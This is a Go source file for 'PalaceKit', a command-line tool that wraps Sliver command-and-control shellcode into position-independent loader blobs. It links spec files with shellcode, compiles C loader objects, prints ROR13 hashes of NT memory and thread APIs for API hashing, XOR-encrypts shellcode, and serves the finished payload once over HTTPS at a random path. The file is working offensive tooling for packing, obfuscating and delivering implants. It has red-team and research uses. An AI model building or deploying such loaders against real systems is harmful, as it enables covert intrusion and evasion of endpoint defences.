package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/spf13/cobra"

	"palacekit/internal/link"
	"palacekit/internal/spec"
)

var root = &cobra.Command{
	Use:   "palacekit",
	Short: "Crystal Palace Kit for Sliver — free reimplementation",
	Long: `PalaceKit builds Crystal Kit-format shellcode loaders for Sliver.

Replaces crystalpalace.jar with a native Go COFF linker that processes
the same spec format (load, merge, dfr, attach, generate, push/xor/link, run, exportfunc).

Workflow:
  1. Build the C objects:    make -C loader/
  2. Wrap a Sliver shellcode: palacekit build --shellcode sliver.bin --spec loader/loader.spec
  3. Inspect hashes:         palacekit gen-hashes
  4. Serve shellcode:        palacekit serve --payload build/palace.bin`,
}

// ── build ──────────────────────────────────────────────────────────────────

var (
	buildSpec      string
	buildShellcode string
	buildOutput    string
	buildVerbose   bool
)

var buildCmd = &cobra.Command{
	Use:   "build",
	Short: "Link spec + shellcode into a PIC loader blob",
	RunE: func(cmd *cobra.Command, args []string) error {
		if buildSpec == "" {
			return fmt.Errorf("--spec required")
		}
		if buildShellcode == "" {
			return fmt.Errorf("--shellcode required")
		}

		sc, err := os.ReadFile(buildShellcode)
		if err != nil {
			return fmt.Errorf("read shellcode: %w", err)
		}
		fmt.Printf("[*] Shellcode: %d bytes\n", len(sc))

		// Inject $DLL variable into the spec evaluator by pre-loading
		// it as a named section. The spec's `push $DLL` will pick it up.
		link.Verbose = buildVerbose
		spec.Debug = buildVerbose
		ev := &spec.Evaluator{
			Verbose: buildVerbose,
		}
		ev.SetVar("$DLL", sc)

		result, err := ev.Run(buildSpec)
		if err != nil {
			return fmt.Errorf("link: %w", err)
		}

		if buildOutput == "" {
			buildOutput = "build/palace.bin"
		}
		if err := os.MkdirAll(filepath.Dir(buildOutput), 0755); err != nil {
			return err
		}
		if err := os.WriteFile(buildOutput, result.Output, 0644); err != nil {
			return err
		}
		fmt.Printf("[+] Loader: %d bytes → %s\n", len(result.Output), buildOutput)
		return nil
	},
}

// ── make-loader ────────────────────────────────────────────────────────────
// Convenience wrapper: compile C objects then run build.

var (
	makeLoaderDir      string
	makeLoaderShellcode string
	makeLoaderOutput   string
)

var makeLoaderCmd = &cobra.Command{
	Use:   "make-loader",
	Short: "Compile C sources and link spec in one step",
	RunE: func(cmd *cobra.Command, args []string) error {
		if makeLoaderDir == "" {
			makeLoaderDir = "loader"
		}
		if makeLoaderShellcode == "" {
			return fmt.Errorf("--shellcode required")
		}

		fmt.Println("[*] Compiling C objects ...")
		mc := exec.Command("make", "-C", makeLoaderDir)
		mc.Stdout = os.Stdout
		mc.Stderr = os.Stderr
		if err := mc.Run(); err != nil {
			return fmt.Errorf("make: %w", err)
		}

		sc, err := os.ReadFile(makeLoaderShellcode)
		if err != nil {
			return fmt.Errorf("read shellcode: %w", err)
		}

		ev := &spec.Evaluator{Verbose: true}
		ev.SetVar("$DLL", sc)

		specPath := filepath.Join(makeLoaderDir, "loader.spec")
		result, err := ev.Run(specPath)
		if err != nil {
			return fmt.Errorf("link: %w", err)
		}

		out := makeLoaderOutput
		if out == "" {
			out = "build/palace.bin"
		}
		os.MkdirAll(filepath.Dir(out), 0755)
		if err := os.WriteFile(out, result.Output, 0644); err != nil {
			return err
		}
		fmt.Printf("[+] Done: %d bytes → %s\n", len(result.Output), out)
		return nil
	},
}

// ── gen-hashes ─────────────────────────────────────────────────────────────

var genHashesCmd = &cobra.Command{
	Use:   "gen-hashes",
	Short: "Print ROR13 hashes for NT API functions",
	Run: func(cmd *cobra.Command, args []string) {
		funcs := []string{
			"NtAllocateVirtualMemory",
			"NtProtectVirtualMemory",
			"NtCreateThreadEx",
			"NtWaitForSingleObject",
			"NtFreeVirtualMemory",
			"RtlExitUserThread",
			"VirtualAlloc",
			"VirtualProtect",
			"VirtualFree",
			"LoadLibraryA",
			"GetProcAddress",
			"LoadLibraryW",
			"ExitThread",
		}
		for _, name := range funcs {
			h := ror13Hash(name)
			fmt.Printf("%-36s 0x%08X\n", name, h)
		}
	},
}

func ror13Hash(name string) uint32 {
	var h uint32
	for _, c := range []byte(name) {
		h = ((h >> 13) | (h << 19)) + uint32(c)
	}
	return h
}

// ── serve ──────────────────────────────────────────────────────────────────

var (
	servePayload string
	servePort    int
)

var serveCmd = &cobra.Command{
	Use:   "serve",
	Short: "Serve a palace.bin payload once over HTTPS",
	RunE: func(cmd *cobra.Command, args []string) error {
		if servePayload == "" {
			return fmt.Errorf("--payload required")
		}
		data, err := os.ReadFile(servePayload)
		if err != nil {
			return fmt.Errorf("read payload: %w", err)
		}

		pathBytes := make([]byte, 8)
		rand.Read(pathBytes)
		path := "/" + hex.EncodeToString(pathBytes)

		return serveOnce(data, path, servePort)
	},
}

// ── xor-wrap ───────────────────────────────────────────────────────────────
// Manual XOR wrap for testing (spec does this automatically via generate+push+xor+link)

var (
	xorInput  string
	xorOutput string
	xorKey    string
)

var xorCmd = &cobra.Command{
	Use:   "xor-wrap",
	Short: "XOR-encrypt a shellcode file with a random key",
	RunE: func(cmd *cobra.Command, args []string) error {
		if xorInput == "" {
			return fmt.Errorf("--input required")
		}
		data, err := os.ReadFile(xorInput)
		if err != nil {
			return err
		}

		key := make([]byte, 32)
		if xorKey != "" {
			key, err = hex.DecodeString(xorKey)
			if err != nil {
				return fmt.Errorf("decode key: %w", err)
			}
		} else {
			rand.Read(key)
		}

		enc := make([]byte, 4+len(data))
		binary.LittleEndian.PutUint32(enc[:4], uint32(len(data)))
		for i, b := range data {
			enc[4+i] = b ^ key[i%len(key)]
		}

		out := xorOutput
		if out == "" {
			out = xorInput + ".enc"
		}
		os.MkdirAll(filepath.Dir(out), 0755)
		if err := os.WriteFile(out, enc, 0644); err != nil {
			return err
		}
		fmt.Printf("[+] Encrypted %d bytes → %s\n", len(data), out)
		fmt.Printf("[+] Key: %s\n", hex.EncodeToString(key))
		return nil
	},
}

// ── main ───────────────────────────────────────────────────────────────────

func main() {
	buildCmd.Flags().StringVar(&buildSpec, "spec", "loader/loader.spec", "path to .spec file")
	buildCmd.Flags().StringVar(&buildShellcode, "shellcode", "", "Sliver shellcode binary to wrap")
	buildCmd.Flags().StringVarP(&buildOutput, "output", "o", "build/palace.bin", "output path")
	buildCmd.Flags().BoolVarP(&buildVerbose, "verbose", "v", false, "verbose output")

	makeLoaderCmd.Flags().StringVar(&makeLoaderDir, "loader-dir", "loader", "loader source directory")
	makeLoaderCmd.Flags().StringVar(&makeLoaderShellcode, "shellcode", "", "Sliver shellcode binary")
	makeLoaderCmd.Flags().StringVarP(&makeLoaderOutput, "output", "o", "build/palace.bin", "output path")

	serveCmd.Flags().StringVar(&servePayload, "payload", "", "palace.bin to serve")
	serveCmd.Flags().IntVar(&servePort, "port", 8443, "HTTPS port")

	xorCmd.Flags().StringVar(&xorInput, "input", "", "shellcode file to encrypt")
	xorCmd.Flags().StringVar(&xorOutput, "output", "", "output file")
	xorCmd.Flags().StringVar(&xorKey, "key", "", "hex key (random if empty)")

	root.AddCommand(buildCmd, makeLoaderCmd, genHashesCmd, serveCmd, xorCmd)

	if err := root.Execute(); err != nil {
		os.Exit(1)
	}
}
